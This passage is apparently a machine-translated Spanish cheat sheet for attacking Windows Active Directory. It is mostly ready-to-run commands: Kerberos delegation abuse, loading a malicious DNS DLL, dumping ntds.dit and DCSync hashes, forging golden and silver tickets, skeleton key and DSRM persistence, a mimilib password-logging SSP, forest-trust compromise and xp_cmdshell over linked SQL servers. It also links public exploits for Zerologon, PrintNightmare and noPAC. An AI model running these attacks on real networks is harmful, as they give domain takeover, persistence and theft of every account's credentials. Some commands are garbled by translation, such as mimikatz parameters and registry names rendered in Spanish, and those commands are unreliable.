Usando PowerView y Kekeo:

```powershell
#Enumerar usuarios y equipos con delegación restringida
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#Si tenemos un usuario con delegación restringida, solicitamos un tgt válido de este usuario usando kekeo
tgt::ask /user:<NombreDeUsuario> /domain:<FQDNDeDominio> /rc4:<ContraseñaHashedDelUsuario>

#Luego, usando el tgt, solicitamos a un TGS un servicio al que este usuario tiene acceso mediante delegación restringida
tgs::s4u /tgt:<RutaDeTGT> /user:<UsuarioParaImpersonar>@<FQDNDeDominio> /service:<SPNDeServicio>

#Finalmente, usamos mimikatz para enviar el tgt TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

_ALTERNATIVE:_
Usando Rubeus:

```powershell
Rubeus.exe s4u /user:<NombreDeUsuario> /rc4:<ContraseñaHashedNTLMDelUsuario> /impersonateuser:<UsuarioParaImpersonar> /msdsspn:"<SPN Del Servicio>" /altservice:<Opcional> /ptt
```

¡Ahora podemos acceder al servicio como el usuario suplantado!

:triangular_flag_on_post: **¿Qué sucede si solo tenemos derechos de delegación para un SPN específico? (p. ej., TIME):**

En este caso, aún podemos abusar de una función de Kerberos llamada "servicio alternativo". Esto nos permite solicitar tickets TGS para otros servicios "alternativos" y no solo para el que tenemos derechos. Esto nos da la posibilidad de solicitar tickets válidos para cualquier servicio que queramos que el host admita, lo que nos otorga acceso total a la máquina de destino.

### Delegación Restringida Basada en Recursos

_¿QUÉ ES DIS?: \
TL;DR \
Si tenemos privilegios GenericALL/GenericWrite en un objeto de cuenta de máquina de un dominio, podemos abusar de ellos y suplantar la identidad de cualquier usuario del dominio. Por ejemplo, podemos suplantar la identidad del Administrador del Dominio y tener acceso total._

Herramientas que usaremos:

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/GhostPack/Rubeus)

Primero, debemos ingresar el contexto de seguridad de la cuenta de usuario/máquina que tiene los privilegios sobre el objeto. Si se trata de una cuenta de usuario, podemos usar Pass the Hash, RDP, PSCredentials, etc.

Ejemplo de explotación:

```powershell
#Importar Powermad y usarlo para crear una nueva CUENTA DE MÁQUINA
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Importar PowerView y obtener el SID de la nueva cuenta de máquina
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Luego, usando el SID, crearemos una ACE para la nueva cuenta de equipo usando un descriptor de seguridad sin procesar:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#A continuación, necesitamos configurar el descriptor de seguridad en el campo msDS-AllowedToActOnBehalfOfOtherIdentity de la cuenta de equipo que vamos a controlar, nuevamente usando PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#Después, necesitamos obtener el hash RC4 de la contraseña de la nueva cuenta de la máquina usando Rubeus
Rubeus.exe hash /password:'p@ssword!'

#Para este ejemplo, suplantaremos al administrador del dominio en el servicio CIF del equipo objetivo usando Rubeus:
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finalmente, podemos acceder a la unidad C$ del equipo objetivo:
dir \\TargetMachine.wtver.domain\C$
```

Artículos detallados:

- [Wagging the Dog: Abusar de la delegación restringida basada en recursos para atacar Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [DELEGACIÓN RESTRINADA BASADA EN RECURSOS ABUSO](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

En la Delegación Restringida Basada en Recursos y Restricción, si no tenemos la contraseña/hash de la cuenta con TRUSTED_TO_AUTH_FOR_DELEGATION que intentamos abusar, podemos usar el ingenioso truco "tgt::deleg" de kekeo o "tgtdeleg" de rubeus y engañar a Kerberos para que nos proporcione un TGT válido para esa cuenta. Luego, simplemente usamos el ticket en lugar del hash de la cuenta para realizar el ataque.

```powershell
#Comando en Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Artículo detallado:
[Rubeus – Ahora con más Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### Abuso de DNSAdmins

_¿QUÉ ES DIS?: Si un usuario es miembro del grupo DNSAdmins, podría cargar una DLL arbitraria con los privilegios de dns.exe que se ejecuta como SYSTEM. Si el controlador de dominio sirve un DNS, el usuario puede escalar sus privilegios a DA. Este proceso de explotación requiere privilegios para reiniciar el servicio DNS y funcionar._

1. Enumere los miembros del grupo DNSAdmins:
- PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
- Módulo AD: `Get-ADGroupMember -Identiny DNSAdmins`
2. Una vez encontrado un miembro de este grupo, debemos comprometerlo (hay varias maneras). 3. Luego, al servir una DLL maliciosa en un recurso compartido SMB y configurar su uso, podemos escalar nuestros privilegios:

```powershell
#Usando dnscmd:
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

#Reiniciar el servicio DNS:
sc \\DNSServer stop dns
sc \\DNSServer start dns
```

### Abuso de DNS integrado en Active Directory

- [Explotación de DNS integrado en Active Directory](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS revisitado](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abuso del grupo de operadores de backup

¿Qué es DIS?: Si logramos comprometer una cuenta de usuario que pertenece al grupo de operadores de backup, podemos abusar de su privilegio SeBackup para crear una instantánea del estado actual del controlador de dominio, extraer el archivo de base de datos ntds.dit, volcar los hashes y escalar nuestros privilegios al administrador de dominio.

1. Una vez que tengamos acceso a una cuenta con el privilegio SeBackup, podemos acceder al controlador de dominio y crear una instantánea usando el binario firmado diskshadow:

```powershell
#Crear un archivo .txt que contendrá el script del proceso de instantánea
Script ->{
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% w:
end backup
}

#Ejecutar diskshadow con nuestro script como parámetro
diskshadow /s script.txt
```

2. A continuación, necesitamos acceder a la instantánea. Si bien podemos tener el privilegio SeBackup, no podemos simplemente copiar y pegar ntds.dit. Necesitamos imitar un software de respaldo y usar llamadas a la API de Win32 para copiarlo en una carpeta accesible. Para esto, usaremos este increíble repositorio [https://github.com/giuliano108/SeBackupPrivilege]:

```powershell
#Importando ambas DLL desde el repositorio con PowerShell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#Comprobando si SeBackupPrivilege está habilitado
Get-SeBackupPrivilege

#Si no lo está, lo habilitamos
Set-SeBackupPrivilege

#Usando la funcionalidad de las DLL para copiar el archivo de base de datos ntds.dit desde la instantánea a la ubicación que elijamos
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

#Volcar la sección SYSTEM
reg save HKLM\SYSTEM c:\temp\system.hive
```

3. Usando smbclient.py de impacket u otra herramienta, copiamos ntds.dit y el subárbol SYSTEM en nuestra máquina local.
4. Usando secretsdump.py de impacket y volcamos los hashes.
5. Usando psexec u otra herramienta de su elección para PTH y obtener acceso de administrador de dominio.

### Abuso de Exchange

- [Abusar de una llamada a la API de Exchange desde DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Intercambiar privilegios por privilegios de administrador de dominio abusando de Exchange

### Armar un error de impresora

- [Error del servidor de impresión al administrador de dominio](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abuso de ACL

- [Escalar privilegios con ACL en Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abuso de IPv6 con mitm6

- [Comprometer redes IPv4 a través de IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [mitm6](https://github.com/fox-it/mitm6)

### Abuso del historial de SID

¿Qué es esto?: Si logramos comprometer un dominio secundario de un bosque y el filtrado de SID no está habilitado (generalmente no lo está), podemos abusar de él para escalar privilegios al administrador del dominio raíz del bosque. Esto es posible gracias al campo [Historial de SID](https://www.itprotoday.com/windows-8/sid-history) en un ticket TGT de Kerberos, que define los grupos de seguridad y privilegios adicionales.

Ejemplo de explotación:

```powershell
#Obtener el SID del dominio actual con PowerView
Get-DomainSID -Domain current.root.domain.local

#Obtener el SID del dominio raíz con PowerView
Get-DomainSID -Domain root.domain.local

#Crear el SID de los administradores empresariales
Formato: RootDomainSID-519

#Forjar el Golden Ticket adicional con mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<SID del administrador empresarial> /desplazamiento inicial:0 /entrada final:600 /máximo de renovación:10080 /ticket:\ruta\a\ticket\golden.kirbi

#Inyectar el ticket en memoria
kerberos::ptt \path\to\ticket\golden.kirbi

#Listar el controlador de dominio del dominio raíz
dir \\dc.root.domain.local\C$

#O sincronizar con DC y volcar los hashes usando mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Artículos detallados:

- [Los tickets dorados de Kerberos ahora son más dorados](https://adsecurity.org/?p=1640)
- [Guía para atacar las confianzas de dominio](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Explotación de SharePoint

- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) Explotación de RCE \
[PoC](https://github.com/k8gege/CVE-2019-0604)
- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Ejecución de código mediante deserialización de BDC
- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) Ejecución remota de código (RCE) mediante convertidores de tipos

[Prueba de concepto](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon

- [Zerologon: Compromiso de controlador de dominio no autenticado](https://www.secura.com/whitepapers/zerologon-whitepaper): Informe técnico de la vulnerabilidad.

- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): Implementación en C# del exploit Zerologon. - [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): Implementación en PowerShell del exploit Zerologon.
- [Zer0Dump](https://github.com/bb00/zer0dump): Implementación en Python del exploit Zerologon usando la biblioteca impacket.

### PrintNightmare

- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Detalles de la vulnerabilidad.
- [Implementación de PrintNightmare con Impacket](https://github.com/cube0x0/CVE-2021-1675): Prueba de concepto (PoC) fiable de PrintNightmare usando la biblioteca impacket. - [Implementación de CVE-2021-1675 en C#](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Prueba de concepto fiable de PrintNightmare escrita en C#.

### Servicios de certificados de Active Directory

**Comprobar plantillas de certificado vulnerables con:** [Certify](https://github.com/GhostPack/Certify)

_Nota: Certify también se puede ejecutar con el comando `execute-assembly` de Cobalt Strike_

```powershell
.\Certify.exe find /vulnerable /quiet
```

Asegúrese de que el valor de msPKI-Certificates-Name-Flag esté establecido en "ENROLLEE_SUPPLIES_SUBJECT" y que los derechos de inscripción permitan usuarios de dominio/autenticados. Además, compruebe que el parámetro pkiextendedkeyusage contenga el valor "Autenticación de cliente" y que el parámetro "Firmas autorizadas requeridas" esté establecido en 0.

Este exploit solo funciona porque esta configuración habilita la autenticación de servidor/cliente, lo que significa que un atacante puede especificar el UPN de un administrador de dominio (DA) y usar el certificado capturado con Rubeus para falsificar la autenticación.

Nota: Si un administrador de dominio pertenece a un grupo de usuarios protegidos, el exploit podría no funcionar correctamente. Compruébelo antes de elegir un DA como objetivo.

Solicitar el certificado de cuenta del DA con Certify

```powershell
.\Certify.exe request /template:<Nombre de la plantilla> /quiet /ca:"<Nombre de la CA>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Nombre alternativo del administrador de dominio> /machine
```

Esto debería devolver un certificado válido para la cuenta del DA asociada.

Los archivos `cert.pem` y `cert.key` exportados deben consolidarse en un solo archivo `cert.pem`, con un espacio entre `END RSA PRIVATE KEY` y `BEGIN CERTIFICATE`.

_Ejemplo de `cert.pem`:_

```
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

#Utilizar `openssl` para convertir al formato PKCS #12

El comando `openssl` permite convertir el archivo de certificado al formato PKCS #12 (es posible que se le solicite una contraseña de exportación, que puede ser la que desee).

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Una vez exportado el archivo `cert.pfx`, cárguelo al host comprometido (esto se puede hacer de diversas maneras, como con PowerShell, SMB, `certutil.exe`, la función de carga de Cobalt Strike, etc.).

Después de cargar el archivo `cert.pfx` al host comprometido, se puede usar [Rubeus](https://github.com/GhostPack/Rubeus) para solicitar un TGT de Kerberos para la cuenta DA, que luego se importará a la memoria.

```powershell
.\Rubeus.exe asktht /user:<Nombre alternativo del administrador del dominio> /domain:<dominio.com> /dc:<IP o nombre de host del controlador de dominio> /certificate:<Ruta de la máquina local a cert.pfx> /nowrap /ptt
```

Esto debería generar un ticket importado correctamente, lo que permite a un atacante realizar diversas actividades maliciosas en el contexto del usuario DA, como un ataque DCSync.

### Sin PAC

- [Suplantación de nombre de cuenta sAMA](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Explotación de CVE-2021-42278 y CVE-2021-42287
- [Armamentización de CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Explotación de CVE-2021-42278 y CVE-2021-42287
- [noPAC](https://github.com/cube0x0/noPac) Herramienta de C# para explotar CVE-2021-42278 y CVE-2021-42287
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Herramienta automatizada de Python para explotar CVE-2021-42278 y CVE-2021-42287
- [noPac](https://github.com/Ridter/noPac) Evolución de la herramienta "sam-the-admin"

## Persistencia de Dominio

### Ataque Golden Ticket

```powershell
#Ejecutar mimikatz en el controlador de dominio como DA para obtener el hash krbtgt:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Nombre del controlador de dominio>

#En cualquier máquina:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Nombre del dominio> /sid:<SID del dominio> /krbtgt:
<HashOfkrbtgtAccount> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### Ataque DCsync

```powershell
#DCsync usando mimikatz (Se necesitan permisos de DA o privilegios DS-Replication-Get-Changes y DS-Replication-Get-Changes-All):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync usando secretsdump.py de impacket con autenticación NTLM
secretsdump.py <Dominio>/<Nombre de usuario>:<Contraseña>@<IP o FQDN del DC> -just-dc-ntlm

#DCsync usando secretsdump.py de impacket con Kerberos Autenticación
secretsdump.py -no-pass -k <Dominio>/<Nombre de usuario>@<IP o FQDN del controlador de dominio> -just-dc-ntlm
```

**Consejo:** \
/ptt -> inyectar ticket en la sesión actual \
/ticket -> guardar el ticket en el sistema para su uso posterior

### Ataque de ticket Silver

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<Nombre de dominio> /sid:<SID del dominio> /target:<La máquina de destino> /service:
<Tipo de servicio> /rc4:<Hash NTLM de la cuenta del SPN> /user:<Usuario al que suplantar> /ptt"'
```

[Lista de SPN](https://adsecurity.org/?page_id=183)

### Ataque de llave maestra

```powershell
#Comando de explotación ejecutado como DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <FQDN del DC>

#Acceso con la contraseña "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### Abuso de DSRM

_¿QUÉ ES DIS?: Cada DC tiene una cuenta de administrador local. Esta cuenta tiene la contraseña DSRM, que es SafeBackupPassword. Podemos obtener esto y luego pasar por PTH su hash NTLM para obtener acceso de administrador local al controlador de dominio.

```powershell
#Volcar la contraseña DSRM (requiere privilegios del DA):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <Nombre del controlador de dominio>

#Esta es una cuenta local, por lo que podemos pasar por PTH y autenticarnos.

#PERO necesitamos modificar el comportamiento de la cuenta DSRM antes de realizar el PTH:
#Conectar al controlador de dominio:
Enter-PSSession -ComputerName <Nombre del controlador de dominio>

#Modificar el comportamiento de inicio de sesión en el registro:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#Si la propiedad ya existe:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

¡Entonces, solo realiza el PTH para obtener acceso de administrador local al controlador de dominio!

### SSP personalizado

¿QUÉ ES ESTO?: Podemos configurar nuestro SSP descargando una DLL personalizada, por ejemplo, mimilib.dll de mimikatz, que monitorizará y capturará las contraseñas de texto plano de los usuarios que hayan iniciado sesión.

Desde PowerShell:

```powershell
#Obtener el paquete de seguridad actual:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty 'Paquetes de Seguridad'

#Añadir mimilib:
$packages += "mimilib"

#Cambiar el nombre de los nuevos paquetes
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Paquetes de Seguridad' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Paquetes de Seguridad' -Value $packages

#ALTERNATIVA:
Invoke-Mimikatz -Command '"misc::memssp"'
```

Ahora todos los inicios de sesión en el controlador de dominio se registran en -> C:\Windows\System32\kiwissp.log

## Ataques entre Bosques

### Tickets de Confianza

_¿QUÉ ES DIS?: Si tenemos derechos de administrador de dominio en un dominio que tiene una relación de confianza bidireccional con un En otro bosque, podemos obtener la clave de confianza y forjar nuestro propio TGT interreino.

:warning: ¡El acceso que tendremos estará limitado a lo que nuestra cuenta DA tenga configurado en el otro bosque!

Usando Mimikatz:

```powershell
#Volcar la clave de confianza
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forjar un TGT entre reinos usando el ataque Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
```

:exclamation: Tickets -> formato .kirbi

Luego, solicita un TGS al bosque externo para cualquier servicio que use el TGT entre reinos y accede al recurso.

Usando Rubeus:

```powershell
.\Rubeus.exe asktgs /ticket:<kirbifile> /service:"SPN del servicio" /ptt
```

### Abuso de servidores MSSQL

- Enumerar instancias MSSQL: `Get-SQLInstanceDomain`
- Comprobar accesibilidad como usuario actual:

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Recopilar información sobre la instancia: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abuso de enlaces de bases de datos SQL: \
_¿QUÉ ES ESTO?: Un enlace de base de datos permite que un servidor SQL acceda a otros recursos como otros servidores SQL. Si tenemos dos servidores SQL enlazados, podemos ejecutar procedimientos almacenados en ellos. Los enlaces de bases de datos también funcionan en toda la confianza de bosques.

Comprobar enlaces de bases de datos existentes:

```powershell
#Comprobar enlaces de bases de datos existentes:
#PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

#Consulta MSSQL:
select * from master..sysservers
```

Luego, podemos usar consultas para enumerar otros enlaces de la base de datos vinculada:

```powershell
#Manualmente:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Enumerará todos los enlaces en los bosques y sus dominios secundarios):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

# Habilitar salida RPC (necesario para ejecutar XP_CMDSHELL)
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true'; EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

#Luego podemos ejecutar el comando en la máquina donde se ejecuta el servicio SQL usando xp_cmdshell
#O, si está deshabilitado, habilítalo:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Ejecución de la consulta:

```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Rompiendo las confianzas del bosque

_¿QUÉ ES DIS?: \
TL;DR \
Si tenemos una confianza bidireccional con un bosque externo y logramos comprometer una máquina en el bosque local que tiene habilitada la delegación sin restricciones (los controladores de dominio la tienen por defecto), podemos usar el comando printerbug para forzar al controlador de dominio del dominio raíz del bosque externo a autenticarse con nosotros. Luego, podemos capturar su TGT, inyectarlo en memoria y usar DCsync para volcar sus hashes, lo que nos da acceso completo a todo el bosque.

Herramientas que usaremos:

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Ejemplo de explotación:

```powershell
#Iniciar la monitorización de TGT con Rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc

#Ejecutar el `printerbug` para activar la autenticación forzada del controlador de dominio de destino en nuestra máquina
SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local

#Obtener el TGT base64 capturado de Rubeus e inyectarlo en Memoria:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Volcar los hashes del dominio de destino usando mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```

Artículos detallados:

- [No es un límite de seguridad: Rompiendo las confianzas de bosque](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Búsqueda en Active Directory: Delegación sin restricciones y confianzas de bosque](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
